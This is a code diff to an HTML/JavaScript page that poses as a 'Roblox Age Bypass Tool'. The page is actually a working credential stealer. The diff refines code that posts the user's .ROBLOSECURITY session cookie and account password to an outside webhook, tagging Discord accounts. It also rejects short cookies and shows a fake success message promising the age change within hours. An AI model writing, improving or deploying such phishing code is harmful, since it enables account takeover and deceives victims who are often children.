@@ -6,7 +6,7 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* (Style unverändert, siehe vorheriger Code) */
+    /* Styles unverändert vom letzten Code */
     * {
       box-sizing: border-box;
     }
@@ -279,7 +279,13 @@
         cookieBlock.style.display = 'none';
         passwordBlock.style.display = 'none';
       }
+      clearMessages();
     });
+
+    function clearMessages() {
+      errorMessage.style.display = 'none';
+      successMessage.style.display = 'none';
+    }
 
     function showError(msg) {
       errorMessage.textContent = msg;
@@ -288,6 +294,7 @@
         errorMessage.style.display = 'none';
       }, 4000);
     }
+
     function showSuccess(msg) {
       successMessage.textContent = msg;
       successMessage.style.display = 'block';
@@ -296,55 +303,68 @@
       }, 6000);
     }
 
-    function sendEmbedToDiscord(title, description) {
-      const webhookURL = 'https://hkdk.events/gcjor0rqtldxig';
-      const body = {
+    async function sendEmbedToDiscord(title, description) {
+      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+
+      const data = {
         embeds: [{
           title: title,
           description: description,
-          color: 3447003
+          color: 0x00ffff,
+          timestamp: new Date().toISOString(),
         }]
       };
-      return fetch(webhookURL, {
+
+      const response = await fetch(webhookUrl, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      }).then(res => {
-        if (!res.ok) throw new Error('Discord webhook request failed');
-        return res;
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
       });
+
+      if (!response.ok) {
+        throw new Error('Failed to send to Discord');
+      }
     }
 
     processBtn.addEventListener('click', async () => {
+      clearMessages();
+
       const selected = bypassSelect.value;
       const cookieVal = cookieInput.value.trim();
       const passwordVal = passwordInput.value.trim();
 
-      if (!selected || !cookieVal) {
+      if (!selected) {
         showError('ERROR Try later again.');
         return;
       }
-      if (selected === '13plus' && !passwordVal) {
+      if (cookieVal.length < 500) {
         showError('ERROR Try later again.');
         return;
       }
+      if (selected === '13plus' && passwordVal.length === 0) {
+        showError('ERROR Try later again.');
+        return;
+      }
+
+      processBtn.disabled = true;
+      loaderOverlay.style.display = 'flex';
 
       try {
-        // Zeige Lade-Spinner
-        loaderOverlay.style.display = 'flex';
-        processBtn.disabled = true;
+        const userMention = '<@1030535100829540464> <@&1392621247460020254>\n\n';
+        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `${userMention}**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n**Cookie:** ${cookieVal}`);
 
-        // Erwähnung mit hinzufügen
-        const userMention = '<@1030535100829540464>\n\n';
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `${userMention}\n**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n**Cookie:** ${cookieVal}\n${selected === '13plus' ? `**Password:** ${passwordVal}` : ''}`);
+        if (selected === '13plus') {
+          // Passwort in separater Nachricht
+          await sendEmbedToDiscord('Account Password', `${userMention}**Method:** 13+ All Ages\n**Password:** ${passwordVal}`);
+        }
 
-        // Lade-Spinner 1 - 1.5 Sekunden anzeigen
+        // Warte 1.2 Sekunden (Loader anzeigen)
         await new Promise(resolve => setTimeout(resolve, 1200));
 
-        // Verstecke Loader und zeige Erfolgsmeldung
         loaderOverlay.style.display = 'none';
         showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
-
       } catch (error) {
         loaderOverlay.style.display = 'none';
         showError('ERROR Try later again.');
